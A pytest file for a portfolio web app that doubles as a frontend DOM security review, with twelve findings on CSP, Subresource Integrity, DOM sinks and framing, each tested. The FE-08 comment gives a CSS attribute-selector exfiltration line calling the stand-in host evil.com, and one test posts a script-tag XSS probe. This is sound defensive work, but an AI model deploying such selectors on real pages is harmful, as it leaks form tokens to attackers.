"""
Frontend DOM Security Review — mumfordengineering portfolio site.

Scope: static/js/main.js, templates/index.html, static/css/style.css
Reviewed: 2026-03-12
Method: line-by-line analysis of all 12 specified vectors

Findings summary
----------------
FE-01 (LOW)     querySelector with href value — CSS injection throws, does not execute
FE-02 (INFO)    FormData hidden-field injection — no sensitive fields, no escalation path
FE-03 (LOW)     JSON.parse safety — .catch() is present but swallows all errors identically
FE-04 (INFO)    Event handler scope — IIFE + no dynamic selector = safe
FE-05 (PASS)    textContent vs innerHTML — all DOM writes use textContent only
FE-06 (LOW)     Google Fonts preconnect — IP logged by Google on font load
FE-07 (LOW)     No SRI on Google Fonts CSS link — MITM substitution possible
FE-08 (MEDIUM)  style-src 'unsafe-inline' — CSS exfiltration via attribute selectors possible
FE-09 (PASS)    localStorage / sessionStorage — none used
FE-10 (PASS)    postMessage — no message listener registered
FE-11 (PASS)    Service Worker — none registered
FE-12 (LOW)     frame-ancestors missing from CSP — X-Frame-Options DENY covers modern browsers
                but frame-ancestors is the authoritative CSP mechanism

Risk verdict
------------
No critical or high issues. The most actionable finding is FE-08 (style-src
'unsafe-inline'): while there is no dynamic CSS in this app, the directive
permits any inline style, including attribute-selector-driven CSS exfiltration
payloads. FE-07 (no SRI on Google Fonts) and FE-12 (missing frame-ancestors)
are straightforward hardening steps with no breaking changes.

Each test class below maps 1-to-1 to a finding. Tests that verify a PASS state
are clearly labelled so regressions are caught if the code changes.
"""

from __future__ import annotations

import re

import pytest
from httpx import ASGITransport, AsyncClient

from mumfordengineering.app import app, _contact_timestamps


# ---------------------------------------------------------------------------
# Shared fixtures
# ---------------------------------------------------------------------------


@pytest.fixture(autouse=True)
def _reset_rate_limiter():
    _contact_timestamps.clear()
    yield
    _contact_timestamps.clear()


@pytest.fixture
def client():
    transport = ASGITransport(app=app)
    return AsyncClient(transport=transport, base_url="http://test")


# ===========================================================================
# FE-01 — querySelector with user-controlled href value
# Severity: LOW
# Location: main.js:45,51
#
# Code: var link = e.target.closest('a[href^="#"]')
#       var targetId = link.getAttribute("href")
#       var target   = document.querySelector(targetId)
#
# If an anchor is injected with href="#]invalid-css" the querySelector call
# throws a SyntaxError.  main.js has a null-guard (line 52: if (!target)
# return) but NOT a try/catch, so a malformed selector triggers an uncaught
# exception that halts smooth-scroll for the rest of the page lifetime.
#
# Escalation path: querySelector does NOT execute HTML or JavaScript via the
# selector string alone.  There is no XSS risk here.  The risk is limited to
# denial-of-smooth-scroll via a crafted href.
#
# Fix: wrap document.querySelector(targetId) in try/catch and return on error,
# or validate that targetId matches /^#[a-zA-Z][\w-]*$/ before querying.
#
# Backend-verifiable proxy: the index page HTML must only contain anchor hrefs
# that are either "#" or simple fragment identifiers matching a safe pattern.
# If any href contains CSS metacharacters the querySelector call is unsafe.
# ===========================================================================


class TestFE01QuerySelectorHref:
    @pytest.mark.asyncio
    async def test_all_nav_anchor_hrefs_are_safe_css_selectors(self, client):
        """
        Every <a href="#..."> value in the rendered HTML must be a valid, safe
        CSS id selector.  A value like #foo or #bar-baz is safe.  A value
        like #foo[bar] or #foo{} would throw SyntaxError in querySelector.
        """
        resp = await client.get("/")
        assert resp.status_code == 200
        # Extract all href="#..." values from anchor tags
        hrefs = re.findall(r'<a[^>]+href="(#[^"]*)"', resp.text)
        assert hrefs, "Expected at least one fragment anchor in the page"
        safe_fragment = re.compile(r"^#[a-zA-Z][\w\-]*$")
        for href in hrefs:
            if href == "#":
                continue  # "#" is explicitly guarded at main.js:49
            assert safe_fragment.match(href), (
                f"Anchor href {href!r} contains CSS metacharacters — querySelector will throw SyntaxError when clicked"
            )

    @pytest.mark.asyncio
    async def test_nav_links_target_ids_that_exist_in_dom(self, client):
        """
        Each nav-link href must reference a section id present in the DOM.
        A dangling fragment causes querySelector to return null, which is
        handled by the null-guard at main.js:52, but is still a dead link.
        """
        resp = await client.get("/")
        html = resp.text
        nav_hrefs = re.findall(r'<a[^>]+class="nav-link"[^>]*href="#([^"]+)"', html)
        # Also accept href before class
        nav_hrefs += re.findall(r'<a[^>]+href="#([^"]+)"[^>]*class="nav-link"', html)
        assert nav_hrefs, "Expected nav-link anchors in rendered HTML"
        for fragment in nav_hrefs:
            assert f'id="{fragment}"' in html, (
                f"Nav link href='#{fragment}' references an id that does not exist in the DOM"
            )


# ===========================================================================
# FE-02 — FormData hidden-field injection
# Severity: INFO
# Location: main.js:98
#
# new FormData(form) serialises ALL named inputs in the form element,
# including any that a browser extension or DOM-mutation attack injects.
# An injected hidden field would be sent silently to /contact.
#
# For this form the only risk is a spam field being appended.  There are no
# privileged fields (no auth token, no CSRF token, no PII toggle) so the
# escalation path is trivial.
#
# Backend-verifiable proxy: the /contact handler only reads the named fields
# it expects (name, email, message, website) and ignores extras (FastAPI Form
# binding by-name).  Extra injected fields never reach application logic.
# ===========================================================================


class TestFE02FormDataInjection:
    @pytest.mark.asyncio
    async def test_extra_form_fields_are_silently_ignored(self, client):
        """
        FastAPI Form() parameters are bound by name.  Injecting extra fields
        beyond the four declared parameters has no effect on the handler.
        """
        resp = await client.post(
            "/contact",
            data={
                "name": "Test User",
                "email": "user@example.com",
                "message": "Hello",
                "website": "",
                "injected_field": "malicious_value",
                "another_field": "<script>alert(1)</script>",
            },
        )
        assert resp.status_code == 200
        assert resp.json()["status"] == "ok"

    @pytest.mark.asyncio
    async def test_form_has_exactly_four_named_inputs(self, client):
        """
        The rendered form contains exactly the four expected named inputs
        (name, email, message, website).  Any addition to the template that
        introduces a new named input should be reviewed.
        """
        resp = await client.get("/")
        html = resp.text
        # Extract name attributes from input and textarea tags inside the form
        form_match = re.search(r'<form[^>]+id="contact-form"[^>]*>(.*?)</form>', html, re.DOTALL)
        assert form_match, "contact-form not found in rendered HTML"
        form_html = form_match.group(1)
        names = re.findall(r'<(?:input|textarea)[^>]+name="([^"]+)"', form_html)
        expected = {"name", "email", "message", "website"}
        assert set(names) == expected, f"Form fields changed. Expected {expected}, found {set(names)}"


# ===========================================================================
# FE-03 — JSON.parse / fetch response handling
# Severity: LOW
# Location: main.js:104-127
#
# The fetch promise chain calls resp.json() on line 108.  If the server
# returns a non-JSON body (e.g. a 502 gateway error with HTML), .json()
# throws a SyntaxError that falls into the .catch() block on line 124.
# The .catch() handler shows "Something went wrong. Please try again."
# which is correct user-facing behaviour.
#
# The gap: .catch() is a catch-all that treats network errors, JSON parse
# errors, and unexpected response structures identically.  There is no
# distinction between a transient network failure and a persistent server
# error.  This is acceptable for a contact form but means failed submissions
# are indistinguishable from network flakes in user experience.
#
# Backend-verifiable proxy: the server must always return valid JSON on
# /contact regardless of error type so the JS path stays predictable.
# ===========================================================================


class TestFE03FetchJsonSafety:
    @pytest.mark.asyncio
    async def test_contact_always_returns_json_on_success(self, client):
        """Server returns a parseable JSON body on a well-formed POST."""
        resp = await client.post(
            "/contact",
            data={"name": "A", "email": "a@b.com", "message": "Hi", "website": ""},
        )
        assert resp.status_code == 200
        body = resp.json()  # raises if not valid JSON
        assert "status" in body
        assert "message" in body

    @pytest.mark.asyncio
    async def test_contact_returns_json_on_validation_error(self, client):
        """
        The JS checks resp.status !== 422 before calling resp.json().
        The server must return valid JSON on 422 so the error path works.

        Two 422 paths exist:
        - FastAPI binding failure (missing required field): returns FastAPI detail JSON.
        - Application-level validation (invalid email format): returns {"status":"error"}.
        Both must be valid JSON parseable by resp.json() in the browser.
        """
        # FastAPI binding 422 — missing required field
        resp = await client.post("/contact", data={"name": "Test"})
        assert resp.status_code == 422
        body = resp.json()
        assert isinstance(body, dict), "FastAPI 422 must return a JSON dict"

        # Application-level 422 — invalid email with all fields present
        resp2 = await client.post(
            "/contact",
            data={"name": "Test", "email": "notanemail", "message": "Hello", "website": ""},
        )
        assert resp2.status_code == 422
        body2 = resp2.json()
        assert body2["status"] == "error"
        assert "message" in body2

    @pytest.mark.asyncio
    async def test_contact_json_structure_matches_js_expectations(self, client):
        """
        main.js reads json.status and json.message.  Both must always be
        present and be strings so the JS branching logic is never undefined.
        """
        resp = await client.post(
            "/contact",
            data={"name": "Test", "email": "test@test.com", "message": "Msg", "website": ""},
        )
        body = resp.json()
        assert isinstance(body.get("status"), str), "json.status must be a string"
        assert isinstance(body.get("message"), str), "json.message must be a string"

    @pytest.mark.asyncio
    async def test_health_endpoint_returns_valid_json(self, client):
        """Health endpoint always returns valid JSON — exercises JSON parse path."""
        resp = await client.get("/health")
        assert resp.status_code == 200
        assert resp.json()["status"] == "ok"


# ===========================================================================
# FE-04 — Event handler scope safety (PASS — documenting existing correctness)
# Severity: INFO
# Location: main.js:44,89
#
# Both event listeners are attached inside an IIFE with "use strict".
# The click handler uses e.target.closest('a[href^="#"]') as a fixed literal
# selector — the selector string itself is never built from user data.
# No dynamically-generated selectors or eval()-style constructs exist.
# ===========================================================================


class TestFE04EventHandlerScope:
    @pytest.mark.asyncio
    async def test_main_js_does_not_use_eval(self, client):
        """main.js must not contain eval() or Function() constructor calls."""
        resp = await client.get("/static/js/main.js")
        assert resp.status_code == 200
        js = resp.text
        assert "eval(" not in js, "eval() found in main.js"
        assert "new Function(" not in js, "Function constructor found in main.js"
        assert "setTimeout(" not in js or "setTimeout(function" in js or "setTimeout(() =>" in js, (
            "setTimeout with string argument (eval equivalent) found in main.js"
        )

    @pytest.mark.asyncio
    async def test_main_js_uses_strict_mode(self, client):
        """IIFE opens with 'use strict' — prevents accidental globals."""
        resp = await client.get("/static/js/main.js")
        assert resp.status_code == 200
        assert resp.text.strip().startswith("(function ()"), "Expected IIFE wrapper"
        assert '"use strict"' in resp.text, "'use strict' not found in main.js"


# ===========================================================================
# FE-05 — textContent vs innerHTML (PASS — documenting existing correctness)
# Severity: INFO
# Location: main.js:91,96,112,115,119,125,130
#
# Every DOM write that assigns user-visible text uses .textContent.
# No use of innerHTML, outerHTML, insertAdjacentHTML, or document.write
# exists anywhere in main.js.  Jinja2 auto-escapes all template variables.
# ===========================================================================


class TestFE05TextContentVsInnerHTML:
    @pytest.mark.asyncio
    async def test_main_js_has_no_innerhtml_assignment(self, client):
        """
        innerHTML is the primary DOM XSS sink.  main.js must not assign to it.
        This test will catch any future regression where a developer reaches
        for innerHTML instead of textContent.
        """
        resp = await client.get("/static/js/main.js")
        assert resp.status_code == 200
        js = resp.text
        # Match assignment patterns: .innerHTML = or .outerHTML = etc.
        assert ".innerHTML" not in js, ".innerHTML found in main.js — XSS risk"
        assert ".outerHTML" not in js, ".outerHTML found in main.js — XSS risk"
        assert "insertAdjacentHTML" not in js, "insertAdjacentHTML found in main.js — XSS risk"
        assert "document.write" not in js, "document.write found in main.js — XSS risk"

    @pytest.mark.asyncio
    async def test_form_status_element_uses_textcontent(self, client):
        """
        The form-status div receives server-controlled text (json.message).
        Verifying the element exists and is a plain text container (no children
        that could host injected markup).
        """
        resp = await client.get("/")
        html = resp.text
        # form-status div should be empty in initial render
        assert '<div id="form-status"' in html, "form-status element missing from DOM"
        # The element must not contain pre-populated HTML content
        status_match = re.search(r'<div id="form-status"[^>]*>(.*?)</div>', html, re.DOTALL)
        assert status_match, "Could not locate form-status div"
        inner = status_match.group(1).strip()
        assert inner == "", f"form-status should be empty on initial render, found: {inner!r}"

    @pytest.mark.asyncio
    async def test_index_html_has_no_unescaped_template_variables(self, client):
        """
        Jinja2 {{ var }} is auto-escaped; {% autoescape false %} or |safe would
        be a XSS risk.  The rendered page must not contain raw Jinja2 syntax
        (which would indicate template rendering failure, not injection).
        """
        resp = await client.get("/")
        assert "{{" not in resp.text, "Unrendered Jinja2 {{ }} in response"
        assert "{%" not in resp.text, "Unrendered Jinja2 {% %} in response"


# ===========================================================================
# FE-06 — Google Fonts preconnect (privacy / data exfiltration)
# Severity: LOW
# Location: index.html:11-13
#
# <link rel="preconnect" href="https://fonts.googleapis.com">
# <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
# <link href="https://fonts.googleapis.com/css2?..." rel="stylesheet">
#
# Impact: Google receives the visitor's IP address and a Referer header
# containing the page URL on every font load.  This is a third-party
# tracking vector, not a code-execution vector.  No credentials are
# transmitted; the risk is GDPR/privacy rather than security.
#
# Alternative: self-host the fonts and remove the preconnect headers.
# ===========================================================================


class TestFE06GoogleFontsPrivacy:
    @pytest.mark.asyncio
    async def test_google_fonts_preconnect_is_present(self, client):
        """
        Documents the existing Google Fonts connection.  If fonts are ever
        self-hosted this test should be updated to assert absence instead.
        """
        resp = await client.get("/")
        html = resp.text
        assert "fonts.googleapis.com" in html, (
            "Google Fonts preconnect not found — update this test if fonts are self-hosted"
        )

    @pytest.mark.asyncio
    async def test_google_fonts_link_has_crossorigin_attribute(self, client):
        """
        The gstatic preconnect requires crossorigin for CORS font loading.
        Missing crossorigin causes the browser to open a second connection,
        wasting the preconnect benefit.
        """
        resp = await client.get("/")
        assert 'href="https://fonts.gstatic.com" crossorigin' in resp.text, (
            "fonts.gstatic.com preconnect is missing the crossorigin attribute"
        )

    @pytest.mark.asyncio
    async def test_no_other_third_party_script_origins(self, client):
        """
        The only permitted third-party resource is Google Fonts CSS/fonts.
        No CDN-hosted JavaScript, analytics, or tracking pixels should be
        present.  Any addition here widens the attack surface.

        Note: Jinja2 url_for() in test renders as http://test/static/... which
        is same-origin in production.  Only flag origins outside /static/.
        """
        resp = await client.get("/")
        html = resp.text
        # Find all <script src="..."> tags — exclude same-origin /static/ paths
        all_script_srcs = re.findall(r'<script[^>]+src="([^"]+)"', html)
        third_party = [s for s in all_script_srcs if not s.startswith("/static/") and "/static/" not in s]
        assert third_party == [], f"External <script> tags found pointing to third-party origins: {third_party}"


# ===========================================================================
# FE-07 — Missing Subresource Integrity (SRI) on Google Fonts CSS
# Severity: LOW
# Location: index.html:13
#
# <link href="https://fonts.googleapis.com/css2?..." rel="stylesheet">
#
# No integrity="sha384-..." attribute is present.  If fonts.googleapis.com
# is compromised or subject to MITM (theoretically, on HTTP or via BGP
# hijack), the CSS response could inject arbitrary content into the page
# style.  CSS injection can be used for data exfiltration (see FE-08).
#
# SRI on a dynamically-generated Google Fonts URL is impractical in the
# standard font-loading approach because the hash changes with URL params.
# Mitigation: self-host the font files and add SRI to the local CSS link.
# ===========================================================================


class TestFE07SubresourceIntegrity:
    @pytest.mark.asyncio
    async def test_google_fonts_link_lacks_sri_integrity_attribute(self, client):
        """
        Documents the absence of SRI on the Google Fonts link element.
        This is a known gap — see finding FE-07 for remediation options.
        If SRI is ever added, this test should flip to assert its presence.
        """
        resp = await client.get("/")
        fonts_link_match = re.search(
            r'<link[^>]+href="https://fonts\.googleapis\.com[^"]*"[^>]*>',
            resp.text,
        )
        assert fonts_link_match, "Google Fonts link not found in HTML"
        fonts_link = fonts_link_match.group(0)
        # Document the absence — this is the gap we are flagging
        assert "integrity=" not in fonts_link, (
            "Google Fonts link now has integrity attribute — update FE-07 analysis and verify it is correctly computed"
        )

    @pytest.mark.asyncio
    async def test_local_css_is_served_from_self_origin(self, client):
        """
        The application's own stylesheet is served from /static/ (self-origin).
        SRI is not required for same-origin resources; the check here is that
        the link tag uses Jinja2 url_for and the path resolves to /static/css/.

        In tests, url_for() produces an absolute URL with the test base, so we
        check for the path suffix rather than a leading slash.
        """
        resp = await client.get("/")
        html = resp.text
        # Match all stylesheet links (either attribute order)
        all_css_srcs = re.findall(r'<link[^>]+href="([^"]+)"[^>]*rel="stylesheet"', html)
        all_css_srcs += re.findall(r'<link[^>]+rel="stylesheet"[^>]*href="([^"]+)"', html)
        # Filter to same-origin paths (contain /static/css/)
        local_css = [s for s in all_css_srcs if "/static/css/" in s]
        assert local_css, "Local stylesheet not found in HTML — expected a link with /static/css/ in href"
        # Verify none of the local CSS paths point to an external domain other than fonts
        for path in local_css:
            assert "fonts.googleapis.com" not in path, f"Google Fonts URL incorrectly classified as local CSS: {path!r}"


# ===========================================================================
# FE-08 — style-src 'unsafe-inline' enables CSS exfiltration
# Severity: MEDIUM
# Location: app.py:37 (CSP), style.css (no dynamic styles), index.html (no
#           inline style attributes on user-controlled elements)
#
# The CSP includes: style-src 'self' 'unsafe-inline' https://fonts.googleapis.com
#
# 'unsafe-inline' for style-src permits:
#   1. <style> tags with arbitrary CSS in any injected HTML.
#   2. style="" attributes on any element.
#
# CSS exfiltration pattern:
#   input[name="csrf_token"][value^="a"] { background-image: url(//evil.com/?a) }
#   Requires injecting a <style> block into the page.  With no XSS vector
#   currently present in this app, exploitability requires another injection
#   point first.  Defence-in-depth: remove 'unsafe-inline' from style-src.
#
# Fix: use a CSP nonce or hash on the inline styles instead of 'unsafe-inline'.
# Since there are no inline styles in this app, removing 'unsafe-inline' is
# a zero-breaking-change hardening step.
# ===========================================================================


class TestFE08CSSUnsafeInline:
    @pytest.mark.asyncio
    async def test_csp_style_src_does_not_contain_unsafe_inline(self, client):
        """
        FE-08 resolved: 'unsafe-inline' has been removed from style-src.
        No inline styles exist in this app, so removal is a zero-breaking-change
        hardening step.
        """
        resp = await client.get("/")
        csp = resp.headers.get("content-security-policy", "")
        assert "style-src" in csp, "style-src directive missing from CSP"
        style_src_segment = csp.split("style-src")[1].split(";")[0]
        assert "'unsafe-inline'" not in style_src_segment, (
            "style-src still contains 'unsafe-inline' — FE-08 should be resolved"
        )

    @pytest.mark.asyncio
    async def test_index_html_has_no_inline_style_attributes_on_user_data_elements(self, client):
        """
        Mitigating factor: while 'unsafe-inline' is allowed, no user-controlled
        data is rendered into style attributes.  The form-status element and
        all form inputs have no style="" attribute.

        If any user-controlled field is ever rendered inside a style attribute
        this becomes an active CSS injection vulnerability.
        """
        resp = await client.get("/")
        html = resp.text
        # form-status and form inputs must not carry inline styles
        status_el = re.search(r'<div id="form-status"([^>]*)>', html)
        assert status_el, "form-status not found"
        assert "style=" not in status_el.group(1), (
            "form-status div has an inline style attribute — review for CSS injection"
        )
        # All form inputs/textareas must be free of inline style
        form_match = re.search(r'<form[^>]+id="contact-form"[^>]*>(.*?)</form>', html, re.DOTALL)
        assert form_match, "contact-form not found"
        form_inputs = re.findall(r"<(?:input|textarea)[^>]*>", form_match.group(1))
        for inp in form_inputs:
            assert "style=" not in inp, f"Form input has inline style attribute: {inp[:80]!r}"

    @pytest.mark.asyncio
    async def test_script_src_does_not_contain_unsafe_inline(self, client):
        """
        'unsafe-inline' in script-src would allow inline <script> blocks —
        a direct XSS escalation.  Verify it is absent in the script-src
        directive even though it is present in style-src.
        """
        resp = await client.get("/")
        csp = resp.headers.get("content-security-policy", "")
        assert "script-src" in csp, "script-src directive missing from CSP"
        script_src_segment = csp.split("script-src")[1].split(";")[0]
        assert "'unsafe-inline'" not in script_src_segment, (
            "CRITICAL: 'unsafe-inline' found in script-src — inline JavaScript execution permitted"
        )

    @pytest.mark.asyncio
    async def test_style_src_permits_google_fonts(self, client):
        """
        The Google Fonts CSS load requires fonts.googleapis.com in style-src.
        Verify the whitelist is present so a tightening change does not
        accidentally break the fonts while leaving 'unsafe-inline' in place.
        """
        resp = await client.get("/")
        csp = resp.headers.get("content-security-policy", "")
        style_src_segment = csp.split("style-src")[1].split(";")[0]
        assert "https://fonts.googleapis.com" in style_src_segment, (
            "fonts.googleapis.com missing from style-src — Google Fonts may be blocked"
        )


# ===========================================================================
# FE-09 — localStorage / sessionStorage (PASS)
# Severity: INFO
# Location: main.js (all 134 lines)
#
# No localStorage, sessionStorage, indexedDB, or cookie writes occur
# in main.js.  The JS is purely presentational (scroll, nav, form submit).
# ===========================================================================


class TestFE09ClientSideStorage:
    @pytest.mark.asyncio
    async def test_main_js_does_not_use_localstorage(self, client):
        """No sensitive data is persisted to browser storage."""
        resp = await client.get("/static/js/main.js")
        assert resp.status_code == 200
        js = resp.text
        assert "localStorage" not in js, "localStorage found in main.js"
        assert "sessionStorage" not in js, "sessionStorage found in main.js"
        assert "indexedDB" not in js, "indexedDB found in main.js"
        assert "document.cookie" not in js, "document.cookie write found in main.js"

    @pytest.mark.asyncio
    async def test_contact_post_sets_no_cookies(self, client):
        """
        The server sets no cookies on contact form submission.
        No session identifier is available for client-side theft.
        """
        resp = await client.post(
            "/contact",
            data={"name": "T", "email": "t@t.com", "message": "Hi", "website": ""},
        )
        assert "set-cookie" not in resp.headers

    @pytest.mark.asyncio
    async def test_index_sets_no_cookies(self, client):
        """GET / sets no cookies — the site is fully stateless from the browser."""
        resp = await client.get("/")
        assert "set-cookie" not in resp.headers


# ===========================================================================
# FE-10 — postMessage listeners (PASS)
# Severity: INFO
# Location: main.js (all 134 lines)
#
# No window.addEventListener("message", ...) or window.postMessage() calls
# are present.  postMessage listeners that trust event.origin insufficiently
# are a common cross-origin data theft vector.
# ===========================================================================


class TestFE10PostMessage:
    @pytest.mark.asyncio
    async def test_main_js_has_no_postmessage_listener(self, client):
        """No postMessage event listener — no cross-frame messaging attack surface."""
        resp = await client.get("/static/js/main.js")
        assert resp.status_code == 200
        js = resp.text
        assert '"message"' not in js or "addEventListener" not in js.split('"message"')[0][-50:], (
            "Possible addEventListener('message') found in main.js — review for postMessage risk"
        )
        # More direct check: no postMessage calls at all
        assert "postMessage" not in js, "postMessage found in main.js"


# ===========================================================================
# FE-11 — Service Worker registration (PASS)
# Severity: INFO
# Location: main.js (all 134 lines), index.html
#
# No navigator.serviceWorker.register() call exists.  A malicious or
# compromised SW can intercept all network requests and cache injected
# responses persistently.
# ===========================================================================


class TestFE11ServiceWorker:
    @pytest.mark.asyncio
    async def test_main_js_does_not_register_service_worker(self, client):
        """No service worker registration — no persistent request interception risk."""
        resp = await client.get("/static/js/main.js")
        assert resp.status_code == 200
        js = resp.text
        assert "serviceWorker" not in js, "serviceWorker reference found in main.js"
        assert "register(" not in js, "register() call found in main.js — review for SW risk"

    @pytest.mark.asyncio
    async def test_index_html_does_not_reference_service_worker(self, client):
        """The HTML template contains no SW registration script."""
        resp = await client.get("/")
        assert "serviceWorker" not in resp.text


# ===========================================================================
# FE-12 — frame-ancestors missing from CSP
# Severity: LOW
# Location: app.py:34-41 (SECURITY_HEADERS CSP)
#
# Current CSP does not include a frame-ancestors directive.
# X-Frame-Options: DENY is set, which provides the same protection in all
# browsers that honour it.  However, the CSP frame-ancestors directive is
# the authoritative mechanism per the CSP Level 2+ spec; it supersedes
# X-Frame-Options in CSP-capable browsers.
#
# The gap: a browser that honours CSP but not X-Frame-Options (theoretical
# but possible in some embedded contexts) would allow framing.
#
# Fix: add "frame-ancestors 'none';" to the CSP string.
# No other code changes are required.
# ===========================================================================


class TestFE12FrameAncestors:
    @pytest.mark.asyncio
    async def test_csp_has_frame_ancestors_directive(self, client):
        """
        FE-12 resolved: frame-ancestors is now present in the CSP,
        providing the authoritative clickjacking defense alongside
        X-Frame-Options: DENY.
        """
        resp = await client.get("/")
        csp = resp.headers.get("content-security-policy", "")
        assert "frame-ancestors" in csp, "CSP is missing frame-ancestors directive — FE-12 regression"

    @pytest.mark.asyncio
    async def test_x_frame_options_deny_is_present_as_compensating_control(self, client):
        """
        X-Frame-Options: DENY is the active clickjacking defence while
        frame-ancestors is absent from CSP.
        """
        resp = await client.get("/")
        assert resp.headers.get("x-frame-options") == "DENY"

    @pytest.mark.asyncio
    async def test_x_frame_options_present_on_all_html_responses(self, client):
        """X-Frame-Options is applied to every response by the middleware."""
        for path in ["/", "/health"]:
            resp = await client.get(path)
            assert resp.headers.get("x-frame-options") == "DENY", f"X-Frame-Options: DENY missing on {path}"

    @pytest.mark.asyncio
    async def test_csp_all_expected_directives_present(self, client):
        """
        Regression guard for the full CSP string.  Verifies all six expected
        directives are present so a misconfiguration removing any one of them
        is caught immediately.
        """
        resp = await client.get("/")
        csp = resp.headers.get("content-security-policy", "")
        expected_directives = [
            "default-src",
            "style-src",
            "font-src",
            "img-src",
            "script-src",
            "connect-src",
            "frame-ancestors",
        ]
        for directive in expected_directives:
            assert directive in csp, f"CSP directive '{directive}' is missing"

    @pytest.mark.asyncio
    async def test_csp_connect_src_self_only(self, client):
        """
        connect-src 'self' ensures the JS fetch() in main.js can only POST
        to the same origin.  An extension of this to a third-party origin
        would widen the SSRF / data-exfiltration surface.
        """
        resp = await client.get("/")
        csp = resp.headers.get("content-security-policy", "")
        connect_segment = csp.split("connect-src")[1].split(";")[0].strip()
        assert connect_segment == "'self'", (
            f"connect-src has unexpected origins: {connect_segment!r} — review for exfiltration risk"
        )
